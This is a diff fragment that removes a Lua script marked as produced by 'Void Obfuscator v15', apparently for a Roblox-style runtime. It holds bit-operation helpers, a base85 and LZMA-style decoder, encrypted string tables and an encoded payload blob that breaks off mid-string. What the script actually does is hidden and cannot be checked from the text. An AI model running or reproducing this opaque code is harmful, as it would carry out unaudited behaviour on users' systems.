@@ -1,2 +1,998 @@
--- [[ Obfuscated By Void Obfuscator v15 ]]
-return (function() local tc local ARt=unpack or table.unpack; local Xwt=(getfenv and getfenv()) or _G local oN local DV local ZM local RX local o local A do if bit32 then tc=bit32.bxor; oN=bit32.band; DV=bit32.bor; ZM=function(a) return bit32.bnot(a) end; RX=function(a,c) return bit32.lshift(a,c) end; o=function(a,c) return bit32.rshift(a,c) end; A=bit32.bxor; else local function _nH(a,b) local r,p=0,1; for _=1,24 do local ab,bb=a%2,b%2; if ab~=bb then r=r+p end; a=(a-ab)/2;b=(b-bb)/2;p=p*2; end; return r; end; local function _bx(a,b) local r,p=0,1; for _=1,32 do local ab,bb=a%2,b%2; if ab~=bb then r=r+p end; a=(a-ab)/2;b=(b-bb)/2;p=p*2; end; return r; end; local function _ba(a,b) local r,p=0,1; for _=1,32 do local ab,bb=a%2,b%2; if ab==1 and bb==1 then r=r+p end; a=(a-ab)/2;b=(b-bb)/2;p=p*2; end; return r; end; local function _bo(a,b) local r,p=0,1; for _=1,32 do local ab,bb=a%2,b%2; if ab==1 or bb==1 then r=r+p end; a=(a-ab)/2;b=(b-bb)/2;p=p*2; end; return r; end; tc=_nH; oN=_ba; DV=_bo; A=_bx; ZM=function(a) return 4294967295-(a%4294967296) end; RX=function(a,c) return (a*(2^c))%4294967296 end; o=function(a,c) return math.floor(a/(2^c)) end; end end;  local Ie8 = function(s, alpha)     local rev = {}     for i = 1, 85 do rev[string.sub(alpha, i, i)] = i - 1 end     local n = #s     local out = {}     local oi = 0     local pos = 1     while pos <= n do         local count = n - pos + 1         if count > 5 then count = 5 end         if count < 2 then break end         local value = 0         for j = 0, count - 1 do             value = value * 85 + rev[string.sub(s, pos + j, pos + j)]         end         for j = count, 4 do value = value * 85 + 84 end         local nb = count - 1         if nb >= 1 then oi = oi + 1; out[oi] = string.char(math.floor(value / 16777216) % 256) end         if nb >= 2 then oi = oi + 1; out[oi] = string.char(math.floor(value / 65536) % 256) end         if nb >= 3 then oi = oi + 1; out[oi] = string.char(math.floor(value / 256) % 256) end         if nb >= 4 then oi = oi + 1; out[oi] = string.char(value % 256) end         pos = pos + 5     end     return table.concat(out) end  local nf = function(buf, len)     local self = {buf = buf, len = len, p = 0, code = 0, range = 0xFFFFFFFF}     return self end  local GHX = function(rc)     local b     if rc.p < rc.len then         b = buffer.readu8(rc.buf, rc.p)     else         b = 0     end     rc.p = rc.p + 1     return b end  local C = function(rc)     if rc.range < 16777216 then         rc.range = bit32.lshift(rc.range, 8)         rc.code = bit32.bor(bit32.lshift(rc.code, 8), GHX(rc))     end end  local u = function(rc, probs, i)     local p = probs[i]     local bound = bit32.rshift(rc.range, 11) * p     local sym     if rc.code < bound then         rc.range = bound         probs[i] = p + bit32.rshift(2048 - p, 5)         sym = 0     else         rc.range = rc.range - bound         rc.code = rc.code - bound         probs[i] = p - bit32.rshift(p, 5)         sym = 1     end     C(rc)     return sym end  local Nv3 = function(rc, nbits)     local res = 0     for _ = 1, nbits do         rc.range = bit32.rshift(rc.range, 1)         local bit         if rc.code >= rc.range then             rc.code = rc.code - rc.range             bit = 1         else             bit = 0         end         res = res * 2 + bit         C(rc)     end     return res end  local EH = function(rc, probs, base, nbits)     local m = 1     for _ = 1, nbits do         m = m * 2 + u(rc, probs, base + m)     end     return m - bit32.lshift(1, nbits) end  local Mz = function(rc, probs, base, nbits)     local m = 1     local res = 0     for i = 0, nbits - 1 do         local b = u(rc, probs, base + m)         m = m * 2 + b         res = res + bit32.lshift(b, i)     end     return res end  local aPK = function(rawStr, origLen, lc, lp, pb)     local rawBuf = buffer.fromstring(rawStr)     local rawLen = #rawStr     local rc = nf(rawBuf, rawLen)     GHX(rc)     for _ = 1, 4 do rc.code = bit32.bor(bit32.lshift(rc.code, 8), GHX(rc)) end      local nps = bit32.lshift(1, pb)     local posMask = nps - 1     local lpMask = bit32.lshift(1, lp) - 1      local isMatch, isRep0Long = {}, {}     for s = 0, 11 do         isMatch[s] = {}         isRep0Long[s] = {}         for p = 0, nps - 1 do             isMatch[s][p] = 1024             isRep0Long[s][p] = 1024         end     end     local isRep, isRepG0, isRepG1, isRepG2 = {}, {}, {}, {}     for s = 0, 11 do         isRep[s] = 1024; isRepG0[s] = 1024; isRepG1[s] = 1024; isRepG2[s] = 1024     end      local posSlot = {}     for i = 0, 3 do         posSlot[i] = {}         for j = 0, 64 do posSlot[i][j] = 1024 end     end     local specPos = {}     for i = 0, 114 do specPos[i] = 1024 end     local align = {}     for i = 0, 16 do align[i] = 1024 end      local function newLenDec()         local d = {choice = {1024, 1024}, low = {}, mid = {}, high = {}}         for p = 0, nps - 1 do             d.low[p] = {}             d.mid[p] = {}             for i = 0, 8 do d.low[p][i] = 1024; d.mid[p][i] = 1024 end         end         for i = 0, 256 do d.high[i] = 1024 end         return d     end     local function decodeLen(d, posState)         if u(rc, d.choice, 1) == 0 then             return EH(rc, d.low[posState], 0, 3)         end         if u(rc, d.choice, 2) == 0 then             return 8 + EH(rc, d.mid[posState], 0, 3)         end         return 16 + EH(rc, d.high, 0, 8)     end     local lenDec = newLenDec()     local repLenDec = newLenDec()      local litProbs = {}     local litCount = bit32.lshift(0x300, lc + lp)     for i = 0, litCount do litProbs[i] = 1024 end      local state = 0     local rep0, rep1, rep2, rep3 = 0, 0, 0, 0     local outBuf = buffer.create(origLen > 0 and origLen or 1)     local outLen = 0      while outLen < origLen do         local posState = outLen % nps         if u(rc, isMatch[state], posState) == 0 then             local prev = 0             if outLen > 0 then prev = buffer.readu8(outBuf, outLen - 1) end             local litState = bit32.lshift(bit32.band(outLen, lpMask), lc) + bit32.rshift(prev, 8 - lc)             local base = litState * 0x300             local m = 1             if state < 7 then                 while m < 0x100 do                     m = m * 2 + u(rc, litProbs, base + m)                 end             else                 local matchByte = buffer.readu8(outBuf, outLen - rep0 - 1)                 while m < 0x100 do                     matchByte = bit32.band(matchByte * 2, 0x1FF)                     local matchBit = bit32.band(bit32.rshift(matchByte, 8), 1)                     local b = u(rc, litProbs, base + bit32.lshift(1 + matchBit, 8) + m)                     m = m * 2 + b                     if matchBit ~= b then                         while m < 0x100 do                             m = m * 2 + u(rc, litProbs, base + m)                         end                         break                     end                 end             end             buffer.writeu8(outBuf, outLen, m % 0x100)             outLen = outLen + 1             if state < 4 then state = 0             elseif state < 10 then state = state - 3             else state = state - 6 end         else             local length             if u(rc, isRep, state) == 1 then                 if u(rc, isRepG0, state) == 0 then                     if u(rc, isRep0Long[state], posState) == 0 then                         state = (state < 7) and 9 or 11                         buffer.writeu8(outBuf, outLen, buffer.readu8(outBuf, outLen - rep0 - 1))                         outLen = outLen + 1                         length = -1                     end                 else                     local dist                     if u(rc, isRepG1, state) == 0 then                         dist = rep1                     else                         if u(rc, isRepG2, state) == 0 then                             dist = rep2                         else                             dist = rep3                             rep3 = rep2                         end                         rep2 = rep1                     end                     rep1 = rep0                     rep0 = dist                 end                 if length ~= -1 then                     length = decodeLen(repLenDec, posState) + 2                     state = (state < 7) and 8 or 11                 end             else                 rep3, rep2, rep1 = rep2, rep1, rep0                 length = decodeLen(lenDec, posState) + 2                 state = (state < 7) and 7 or 10                 local lenState = length - 2                 if lenState > 3 then lenState = 3 end                 local slot = EH(rc, posSlot[lenState], 0, 6)                 if slot < 4 then                     rep0 = slot                 else                     local ndb = bit32.rshift(slot, 1) - 1                     rep0 = bit32.lshift(bit32.bor(2, bit32.band(slot, 1)), ndb)                     if slot < 14 then                         rep0 = rep0 + Mz(rc, specPos, rep0 - slot, ndb)                     else                         rep0 = rep0 + bit32.lshift(Nv3(rc, ndb - 4), 4)                         rep0 = rep0 + Mz(rc, align, 0, 4)                     end                 end             end             if length ~= -1 then                 for _ = 1, length do                     if outLen >= origLen then break end                     buffer.writeu8(outBuf, outLen, buffer.readu8(outBuf, outLen - rep0 - 1))                     outLen = outLen + 1                 end             end         end     end      return buffer.tostring(outBuf) end  local TYB = function(encoded, alphabet, origLen, lc, lp, pb)     return aPK(Ie8(encoded, alphabet), origLen, lc, lp, pb) end ; local Qj={(tc(0xaf,0X3a)+0x2a_9-0B10101010_01),tc(237,tc(237,tc(129,0B10100111))),tc(36,167),((172+1072)-0b10000110000),(tc(0B10100011,0X79)+0B110110101-0b110110101),((90+6486)-6486),(tc(0Xc3,0B100011)+0B1001110-78),(tc(0x9e,0x8)+0X3_22-802),(tc(0B1110_01,0X30)+893-0x37d),(tc(0X96,0xa5)+0X2b_4-0b1010110100),tc(0X32,0xf0),((125+0b111110111101)-4029),((24+7844)-0B1111010100100),((0B10111111+9555)-0B1_0010101010011)} local PtX=#Qj local xWm={((43+0xc42)-0Xc42),(tc(0B1_101100,0x8f)+0X23-0x23),tc(64,tc(64,tc(0B10000000,0X95))),tc(0B10110_10,tc(90,tc(0X5d,0B1000000))),tc(216,0Xc5),((101+0b101100010111)-2839),(tc(52,47)+0x13a-0B100111010),((0b110000_11+3522)-0b110111000010),(tc(0b1011,0B1010110)+0b1001010111-599),tc(214,tc(214,tc(0x6d,144))),((0Xc1+2339)-2339),((42+5002)-5002),(tc(0xe2,0b101011)+0b1000100111-0b1000100111),((0B10101010+6460)-6460)} local NVJ=#xWm local kz={"\208\44\56\49\190\219\53\156\213\167\138\175","","\182\138\22\138\189\253\151\63\119\71\200\206\253\140\134\105\44\143\228\53\228\53\236","\144\201\119\240\220","\84\171\24\241\30\219\13\93\85\230\162\79\126\68\39\170\179\22\3\204\3\181\142\22\237\157\85\218\221\121\209\189\207\125\116\44\4\84\173\238\46\209\182","\178\168\183\50","\15\12\22\208\156\125\213\60\85\100\169\239\255\7\70\73","\240\42\246\114\156\125\244\221","\50\235\149\17\157","\82\10\119\177\93\62","\175\107\215\50\220","\49\44\246\240","\82\107\55\178\220\126","\176\44\55\20\63",0,"\207\233","\80\11\214\114\253","\208\171\23\50","\212\44\56\112\190\156\215\62\22\198","\118\42\246\112\190\156\215\62\22\198","\51\44\149\84\156\158\181\63\119","\84\107\246\208\190\190\151",1,"\178\171\87\113","\210\171\150\20",2,"\180\170\87\114\125\29\212\190\22\228",0.0024,"\178\168\183\50\125\30","\19\75\87\20\63\29\117\190","\84\11\149\116\252\1\53\189\85","\180\171\56\178\185\61\149\190\118","\52\11\24\208\190\53\149\63\119\198\135\47\252\228","\52\11\24\208\190\53\23\93\150\135\169\241\160","\52\11\24\208\190\53\148\188\213\196","\52\11\24\208\190\53\151\63\24\134","\52\11\24\208\190\53\87\253\54\229\106\81","\52\11\24\208\190\53\212\190\119","\52\11\24\208\190\53\87\190\149\198\8","\52\11\24\208\190\53\213\125","\52\11\24\208\190\53\119\156\117\70\106","\52\11\24\208\190\53\119\190\56\230\169","\213\112","\213\48\242\207","\175\107\149\18","\114\44\56\52\220\29\13\255\81\34\67","\175\107\149\18\252\219\87\62\182\7","\240\44\246\211","\239\44\184\20","\114\44\151\52\62\156\181","\176\44\117\52\126","\208\44\56\177\93\30\244","\178\171\117\17\190","\210\138\149\20","\84","\15\233\85\114\157\61\119\188\56\198","\178\107\87\20\220\125\212\254","\50\201\150\208\156","\239\44\215\148\220\61\22\60","\82\44\56\49\190\219\53\156\213\167\138\175","\210\107\119\113\252\92\53\127\85","\214\107\119\113\252\92\53\127\85","\82\137\149\243\93","\143\171\56\145","\114\171\246\18\125\252",5,10,"\54\11\149\179\190\156\119","\179\107\85\178\157\64\148\63\216\198\198","\83\170\85\113","\19\233\51\240\63\221\181\158",1.5,"\148\12\19\45\196\225\22\190","\51\10\56\148\248\253\87\220\214\135\169","\118\44\183\17\62\190\53\156\85\230\226\209\61\198\135\234\147","\182\44\55\50\29\61\87\156\20\198\198\145\125\164\7","\118\107\117\17\125\91\91\190\247\229\42\239\126\7\7\138\205\140\228\19\163\117\204","\54\11\149\114\190\97\149",142823291,"\20\201\149\116\63\189\53\23\18\6\198\82\86\6\175\165\142\211\157\176\68\22\79","\20\239\212\110\121\1\217\34\145","\210\171\119\208","\85\175\81\47\7\225\22\190\22\196\135\175\86\4\70\43\179\174\67\204\67\181\174\20\17\167","\214\48\113\141\121\33\120\255\210\226","\150\237\18\80\89\98\184\162\20","\54\205\210\143\56\63\187\65\114","\54\46\113\13\58\162\250\1\52\2\4\45","\54\46\179\13\58\162\250\1\52\2\4\45","\147\170\246\80\63\156\52\156\216","\84\107\23\49\125\29","\85\175\81\47\7\97\212\220\213\229\42\207\86\39\7\75\51\111\228\52","\85\175\81\47\7\1\244\23\119\71\198\111\253\7\201","\51\10\56\148\122\253\151","\47\10\56\148\252\147\236\245\213\165\41\241\126\163\135\161\211\111\67\210\76\53\206\157\113\127\23\242\63\23\209\62\110\220\180\140\68\13\229\13\108\145\54\248\105\156\39\227","\239\44\215","\90\177\0\203\68\253\213\20\22\173\232\58\87\238\113\192\137\211\91\53\45\139\204\250\111\165\254\125\23\174\74\220\237\71\178\108\47\84\144\70\19\10\20\183\134\189\78\190\54\159\91\216\197\148\132\152\174\70\24\108\45\117\47\150\56\71\93\237\209\200\43\101\237\146\195\203\227\93\53\54\246\239\57\113\27\140\132\129\203\33\2\147\252\170\13\196",4,30,100,12,"\47\10\56\148\252\147\236\245\247\71\230\209\253\69\136\193\20\12\131\172\163\146\77\157\208\133\188\22\29\246\41\61","\47\10\56\148\252\147\236\245\213\101\42\150\64\198\70\74\147\237\4\108\197\53\47\86\81\125\117\218\222\214\202\229\79\125\147\169\196\180\133\174\171\45\84\183\190\180\228\227\63\38\210\161\172\94\98\226\110\5\24\106\101\60\47\187\87\197\164\172\146","\47\10\56\148\252\147\236\245\149\71\170\175\160\76\233\233\243\143\228\209\76\244\14\85\245\30\254\186\221\184\10\61\239\38","\180\44\245\178\188\220\151\226\87\38","\180\44\245\178\188\220\151\98\182\70\73\175","\118\44\149\211\190\156","\118\44\149\211\190\156\250\129\85\7\169\142\221\100\233\40","\118\44\149\211\190\156\250\226\150\230\138\49","\118\44\149\211\190\156\250\35\182\135\42\175\29\7","\19\235\22\141\63\252\180\190\56","\19\235\22\141\63\252\180\190\56\0\134\175\62\228\102\138\20\203\162","\19\235\22\141\63\252\180\190\56\0\101\110\221\4\136","\19\235\22\141\63\252\180\190\56\0\37\142\190\99\7\201\177","\212\170\246\241\190\156\119\127\216\228\10\175","\212\170\246\241\190\156\119\127\216\228\10\175\59\0\7\234\147\79\6\244\197\179","\212\170\246\241\190\156\119\127\216\228\10\175\59\33\70\138\178\45","\212\170\246\241\190\156\119\127\216\228\10\175\59\96\102\107\19\174\196\83","\182\44\87\20\58\219\181\189","\86\44\149\116\125\29\47\128\85\133\135\234\29\99\103\170","\84\201\149\114\253\188","\19\235\22\114\220\251\119\30\85\165","\217\113\192","\180\171\119\20\222\156\52\221\149\198\198","\182\201\149\211\190\220\181\93\209\100\169\14\253\5","\182\201\149\211\190\220\181\93\209\100\169\12\128\36\102\72\147","\182\201\149\211\190\220\181\93\209\100\169\237\125\4\105\170\241","\182\201\149\211\190\220\181\93\209\100\169\107\61\4\39","\116\11\24\50\250\126\180\253\148\130\100\26\88\206\241","\212\201\22\50\93\162\53\189\150\0\229\108\152\142\241\65","\86\138\149\84\253\160\181\190\23\198\198",9,"\20\75\85\177\190\29\151",8,"\212\107\54\17\60",7,"\150\75\150\180\188\253",6,"\246\170\246\20\63\62\181","\179\44\213\50\93\221\53\93\216","\118\171\119\50",3,"\150\75\85\240\189\252\244\221","\47\10\56\148\252\147\236\245\117\70\230\239\61\198\39\193\83\110\252\244\197\180\142\213\110\191\124\52\222\214\168","\150\75\86\208\125\60\212","\208\44\56\50\28\253\117\188\119\6\198\142\126\227\7","\240\170\246\18","\47\107\214\113\94\251\212\127\119\70\106\142","\239\44\215\114\254\220\244\125\87\165\169","\240\170\119\50\252\125\245\221\213\229","\115\107\117\173\158","\82\168\246","\114\44\151\52\190\188\151","\240\11\24\147\188\188","\47\10\56\148","\208\44\56\241\190\29\215","\47\10\56\148\119\156\181\61\87\198\230\209","\118\44\151\52\190\188\151\35\24\68\74\239","\150\201\55","\147\44\56\145\125\221","\51\44\149\18\190\156\119","\116\107\54\179","\178\107\246\52\189\158\181\93",1000000,"\240\107\119\49\63\219","\184\52\254\76\94\224",1000,"\184\52\254\76\94\161","\184\52\254\76\94","\15\137\149\177\220\188","\215\233\22\84\92\253\87\125\142\97\167\16\220\99\199\255\209\111\67\83\96\210\236\86\81\39\248\54\93\81\42\190\174\126\148\178","\212\48\52","\150\233\22\84\165\98\245\190\182\228","\147\107\120\177\157\220\53\245\79\46\31","\115\237\210\204\154\253\117\253\117\198","\176\171\56\178","\15\12","\50\11\149\179\62\29\245","\143\171\184\144\157\126\54\190\56\133","\182\44\55\50\29\61\87\156\115\6\3\206\126\164\7\38\114\235\4\244\68\244\204","\239\171\23\50","\50\201\150\114\190","\214\171\150\20\90\61\87\99\246\70\138\207","\180\171\56\178\222\126\119\190","\86\168\246\114","\19\10\22\49","\85\175\81\47\7\193\53\156\213\167\41\241\253\140\38\233\20\142\157\149\163\181\237\86\15","\118\44\23\240\156\253\119","\19\75\247\50\93\219\244\93\216","\212\44\56\144\220\61\213\62\118\198\133\48\223\100","\19\75\247\240\253\253\123\190\56\37\169\18","\243\171\23\50","\85\175\81\47\7\64\87\253\181\70\138\175\86\4\70\43\179\22\197\244\164\22\204\118","\214\44\149\148\125\29\119","\211\106\246\50\158","\50\171\150\84\252","\118\171\119\177\156\123","\19\10\22\49\89\126\180\190","\15\75\87\50\220\219","\180\171\56\178\58\193","\20\43\214\52\93\219","\246\171\55\52\190","\182\107\56\178\157\0\53\157\87\198","\82\107\119\20","\243\107\246\50","\244\170\246\18\90\125\87\125\119\131\10\47\220\5","\54\11\149\179\190\156\249\188\214","\182\201\149\18\190\34\187\34","\182\201\149\18\190\34\187\34\148\97\10\110\29\228","\244\170\119\50","\19\233\145","\212\42\150\78\188\219\151\253\182","\19\10\22\49\252","\212\44\56\14\190\188\117\190\182\230\41\142\223\166","\19\43\149\241\190\130\183\156\119\6\74","\182\44\184\20\218\251\151\156\150\38","\19\10\22\49\58\193","\86\44\246\18","\86\44\246\18\216\253\55\188\85\133\135","\182\201\149\18\190","\118\44\151\52\190\188\151","\147\107\24\116\190\130\183\156\119\6\74\58\186\4\134\107\210","\20\235\56\177\92\126\151\190\117","\244\170\119\50\248\253\87\220\85\165","\180\44\85\17\62\29\181","\180\44\85\17\62\29\181\128\56\71\137\175","\118\44\118\50\254\219","\243\107",0.3,0.1,"\20\235\85\50\29\219","\20\235\85\50\29\219\155\93\213\230\169","\20\235\85\50\29\219\89\156\182","\84\107\246\209\62\156\180","\118\44\85\50\62\28\52\221\149\161\169\50\255\228\201\136","\86\10\149\84\156\223\87\63\117\198",0.4,"\54\11\149\179\190\156\47","\54\11\149\179\190\156\79","\54\11\149\179\190\156","\85\175\81\47\7\223\87\63\117\198\1\82\126\198\41\201\147\203\157","\56\75\214\20\7\219\53\93\149\198\135\214\86\5\7\107\178\47\196\243\68\117","\85\175\81\47\7\223\87\63\117\198\1\18\253\227\70\136\147\22\37\243\229\242\77\181\238","\212\44\56\16\220\126\149\190\20\228\41\209\255\166","\211\76\245\50\220\97\151\190\86","\180\44\85\17\62\29\181\65\85\69\167\175\160\7","\84\171\246\114\190\220\91\190\215\196\169\241\223","\150\137\54\178\156\253\155\93\213\230\169","\211\75\81\17\62\253\212\156\81\37\169\142\223","\175\171\87\20\121\30\213\190\56","\179\171\87\20\121\30\213\190\56","\85\175\81\47\7\255\212\63\87\228\10\110\128\99\232\170\179\22\4\19\163\21\204\253\240\160\87\19\53","\148\75\149\82\157\253\149","\212\44\56\144\220\61\23\190\56\228\40\235\93\100\102\234\147\142\103\243\99\86\76\117","\147\107\54\52\157\253\119","\182\201\149\18\190\224\244\158\87\229\169","\118\44\151\52\190\188\151\125\81\38\41\16\220\228\39","\84\138\149\84\63\190\151\190\56","\51\42\23\178\93\61\52\158",0.5,"\85\175\81\47\7\1\244\23\214\228\169\174\160\140\41\233\44\140\67\244\3\53","\143\170\246","\114\44\23\240\92\253","\82\44\56\114\157\125\23\95\150\71\198\207","\20\201\149\116\63\189\53\23\18\6\198\82\86\6\175\36\82\172\67\204\160\19\204\85\113\199\181\178\191\144\76\27\110\221\178\204\40\169","\208\233\24\82","\47\10\56\148\252\147\236\245","\20\205\145\112\59\161\57\23\18\2\194\78\86\6\175\165\142\211\157\239\68\83\204\181\17\224\23\244\53\29\9\62\16","\150\233\22\84\195\86","\56\146","\180\170\87\148\157\126\54\193\213\197\169","\23","\212\44\246\50\220\126\151\190\117\172\1","\176\171\56\50","\152\172\31\42\189\244\173\158\237\206\6\25\245\255\240\162\205","\182\107\56\178\157\86\219\63\118\196\169\25\86","\182\107\56\178\157\86\56\156\85\197\230\25\86","\114\44\183","\151",60,"\85","\146\137\183\50\220","\149","\152\233\189\147\166\221\13\155\237\206\230\88\253\100\199\10\44\141\157\79\100\19\76\117\88\199\125\54","\80\107\246\114\63\219","\123","\54\111\83\16","\84\107\246\20\190\29\151\181\115\68\7\175","\16\137\183\17\62\190\53\156\214\6\74\118\157\166\70\201","\115\237\210\204\186\29\117\253\117\198","\80\107\246\20\190\29\151","\54\175\83\16\186","\86\10\149\20\188\188\121\253\117\198",200,"\50\171\87\20\190","\47\10\56\148\252\147\236\245\247\71\230\209\253\69\136\193\20\12\131\172",5000,"\19\79\83\174\89\225\13\2\210\224\1\87\213\238\194\98\11","\96\5\237",2000,"\147\175\83\112\58\0\185\23\242\66\131\88\85\13\241\102\202\55","\34\101\44\58",500,"\116\174\209\138\26\97\155\23\238\238\191\90\88\171\142","\96\196\141","\212\111\210\14\7\65\56\128\237\110\129\58\88\142\206\34","\34\101\107\121",15,"\243\111\115\45\59\192\13\2\210\224\1\87\213\110\17\98\11","\179\111\211\138\26\97\155\23\238\235\129\58\247\107","\96\70\139","\96\70\170","\96\70\75",25,"\96\70\107","\152\233\189\42\252\86\22\182\117\111\136\88\245\166","\47\10\56\148\252\147\236\245\181\198\198\142\21\39\41\202\74\206\228\243\68\53\174\155\145\65\244\52\157\189\43\36","\248\108\149\49\190\97\212\125\119\71\74\239\253\127\39\191","\246\174\81\16\58\224\13\34\178\35\102\14\248\96\37\38\78\75","\48\139\181\179\189\220\80\160\24\198\198\25\86","\56\146\177","\23\214","\19\16\96\138","\150\233\22\84\58\221","\20\108\22\75\7","\20\235\85\240\188\29\151\35\149\198","\56\12\149\179\252\153","\86\44\119\211\190\156\78\23","\82\42\117","\123\139\181\146","\242\171\55\52\190","\15\75\55\177\93\253","\246\175\51\48\59\223\56\225\178","\48\139\181\179\189\220\80\128\150\228\41\206\86\67\135\137\145\174\90\204","\19\10\22\49\252\147\13","\118\44\85\50\62\28\181\93\49\111","\183\147","\19\79\243\46\89\223\248\65\212\111\196\14\249\96\194\134\78\104\200","\48\139\181\179\189\220\80","\20\75\85\177\190\29\151\84\237","\56\9\189\237\125\221\148\60\49\111","\150\75\150\180\188\253\78\23","\56\9\189\207\62\29\151\63\149\198\223\88","\179\44\213\50\93\221\53\93\216\172\1","\56\9\189\80\63\156\181\84\237","\150\75\85\240\189\252\244\221\49\111","\56\9\189\110\125\252\180\253\182\172\1","\48\139\181\148\220\61\148\253\149\170","\48\139\181","\182\111\179\138\58\223\185\161\20","\244\46\51\13\7\97\216\192\81\34\131\106\156\97","\85\78\150\50\124\86\57\157\118\111","\56\174\56\50\189\188\13\253\182\111\3\48\160\7\7\202\17\169\156","\20\239\52\173\121\1\123","\85\206\214\177\93\86\123\190\56\37\169\18\250\139",9109504,16711680,13369344,10027008,6684672,4456448,"\20\205\145\112\59\161\57\23\18\2\194\78\86","\56","\178\170\56\17\190","\80\107\55\240\220","\240\170\22\17\158\188","\20\201\149\116\63\189\53\23\18\6\198\82\86\71\145\193\42\87\91\204\6\140","\178\44\184\20","\240\107\214\20\190\156","\24\52\148\41\166\252\172\182\117\224\161\75\151\236\2\64\139\231\70","\178\170\23\50\252\219\53\189\247","\20\201\149\116\63\189\53\23\18\6\198\82","\146\233\22\84\93\126\180\190","\144\43\117\50\158\188","\52\44\247\50\220\123\244\221\85\111\193\23\122\194\131\101\16\234\169\204\255\114\178\247\151\95\220\118\130\206\178\130\51\218\91\85","\50\171\152\17\125\126\149","\148\75\85\84\60\92\151","\56\108\214\20\7\93\52\156\237\167\40\88\122\198\135\105\20\238\165\204\255\118\174\243\151\160\148\28\130\62\112","\56\9\189\144\63\188\151\190\181\68\223\88","\143\44\87\116\63\62\181","\208\44\56\241\254","\82\10\22\148\59\29\52\189\213\228\169","\212\44\56\112\190\156\215\190\56\224\40\82\253","\246\174\179\112\190\156\215\190\56","\212\44\56\144\157\126\54\190\56\133","\47\168\54\84\125\62\181\221","\16\201\85\50\188\188","\80\107\54\50\28","\246\174\179\138\248\253\87\220\85\165\230\88\29\36\41\3\209\172\131\210\100\210\238\86\15\9","\244\46\51\13\7\160\181\93\183\198\198\241\86\96\233\170\114\140\157\47\37\146\110\149\81\94\117\147","\246\174\179\138\248\253\87\220\85\165\1\207\253\7\7\107\177\174\6\76\139\149\14\243\145\160\148\179\246\82\241","\86\44\119\211\190\156\13\222\87\229\138\214\86\131\70\9\50\47\196\181\76\78\54","\54\11\149\179\190\156\57\158\117\198\137","\54\11\149\179\190\156\91\190\86\6\71\47\29\37","\85\175\81\47\7\1\244\23\119\165\41\207\253\100\231\137\147\22\164\83\35\54\142\253\206\224\119\210\189","\85\175\81\47\7\192\244\63\117\70\74\111\86\162\199\73\19\12\4\204\67\118\174","\54\11\22\178\252\253\13\252\213\70\135\214\86\7\166\42\209\22\131\19\100\244\204\20\113\199\53\243\254\144\41\189\238\252\26\169\230\108\136\111\85\233\172\184\2\92\39\70\32\231\115\99\44\220\100\195\174\164\248\235\5\59\206\21\214\28\165\12\84\162\68\195\108\168\99\69\190\116\48\243\177\23\83\26\155\149\5\119\169\216\237\76\189\35\79"} local JkZ JkZ=function(K) local P=kz[K] if type(P)~="string" then return P end local Rv7={} for Se=1,#P do Rv7[Se]=string.char(tc(((sm[(string.byte(P,Se))+1]-((xWm[(Se-1)%NVJ+1]+((Se-1)*0x1d71_4+0x8e2cd)%0x100))%256)%0x100),tc(Qj[(Se-1)%PtX+1],((Se-1)*0B1111000_0101100010+84860)%256))) end return table.concat(Rv7) end; local Gi={tc(0B10000101,tc(0B10000101,tc(0b101111,0Xdf))),(tc(0B100100,12)+0x1eb-491),(tc(167,0X8d)+0B1010001111-0B1010001111),tc(0b11001,tc(0b11001,tc(0B1000010,106))),(tc(0X47,0X14)+205-0B11001101),(tc(0xc,0b1_1111111)+637-637),((0X7a+0B10_10011011100)-0B1010011011100)} local tR=#Gi local Wi={((0B11111110+0X2153)-0x2_153),(tc(139,0b101001)+241-241),tc(0X43,0x92),((0B10100100+0X1db8)-0b1110110111000),(tc(0b10111011,0X4b)+0B11110001_01-965),(tc(24,160)+785-0B1100010001),((0B1100000+0x20_ea)-0X20ea),tc(239,64)} local KA=#Wi; local dK="zvgyXOqku3iD76oQHpTAC1lxLwsaIKRtGBmj0/NYZV9eFh2P4fUSdJMcW+b5nrE8" local jwQ={} for K=1,64 do jwQ[string.sub(dK,K,K)]=K-1 end local FB FB=function(qtH) local P,Se,Rv7,Rv=0,0,{},1 for T=1,#qtH do local w6=string.sub(qtH,T,T) local m=jwQ[w6] if m then P=P*64+m Se=Se+6 if Se>=8 then Se=Se-8 local JNt=math.floor(P/2^Se) P=P-JNt*2^Se Rv7[Rv]=JNt Rv=Rv+1 end end end return Rv7 end; local tm6={} tm6[1]={u7T=FB(TYB("VL+kYCfi0+wfiEfjG92)V$S*=qIiT*g7X>OM`pw<ZQ?+AV(k4oOeY1LrSrEY|Nyhdimbm4}eHBZp1BQHnixl-!TTP@34?dp7&FBZeN|1!eBup@^r_TjMTDiL4-!IC@^BYPRL<ZrjeU2B<KzP8?N=k1;*J2_&CEy0otkdV9Gl$3i7o=WhA)I2Q!3%Irpvt_6RCD&lu@OVlct0n}S&f@GVkT7P@q5)PW)2DHMp-gqlIx;Fcx0kS~jz876DtScKQ>qFKPHa_9h?k3k06;uTE8hG>IKO!p(x{!L3OE6A@*H}y=cPbcCe6P0IPzhuTlQVMmVk(raLMjLOr%Q{?FH@_T6-07S*40vFNzo&TjeZxZ?V|c23lpzYl3Q?inG<~7^)fj@;XrJpDcu&sTy&zc$EBsT_v^JOx}Yf+;`#IsIuT8;s4$f`k}1f+1@ZV`Q+g1S5Kdo8`S%NK2Ye2mn1g2ZX0Cv4k+fG6h2Yg(%a@OG`s<_@=LVo(?86N?GE6jJIb<B&Rh;va$)#B~re0=<sKLpQ?JJPIe%g2AX5~aaGQs@zXDT6oTZT+Thn<531YWV8B+xxO-L-ezz`gDj79b~#UxwhcgxtMP0nj%b_2DCimT!i@3Skcc70^tbSqXk1SR$^k-?SR~btM!F8xCV7v$2V)@Er7blZJEQa%(gAr$TUKaOy=k_N8m>TvKM+k?lwCLLI)-~y?22%l<s=TX}dyYqQPKtn#S%~7Vm#stZa*TMMf#RYcPtjU_?0UOD@dld8AguuR`tPxMK72Iy?mJZgJES*NLmc93WOS9VWB`4R?z~}CU49)u_9$ekofi6sRu|}bUK#WV>=srveJx@oSBNA|y8#F<uwSIXCSpx3TJ~rej1o`g9rfqd^ZLDfo-9tsj!s)Om>kvhZxkFH$xL<Kuu@O3jUs^F>v25oi>-wovo0e)>x3H*?4!XkTeQ`1QLIufEWk+g%>+;_2sdr#ot|A6pCP{DWd@bk<)_IZcfvtA18|cLCYyhgy+@4L<{E3Vz2udjS?vQ?GF>6zsXkLPkZ+?Z(VNI|}{DwoNz&I5=j_x<Q<Wl7Mkb?M_8gtR>=`!zbbjBBfZ1U_gI<W?c^0PsP^APj>1BZD+F#Hga)8-|OO;=;@V`E<CFvS>*-?Sog4)RDPz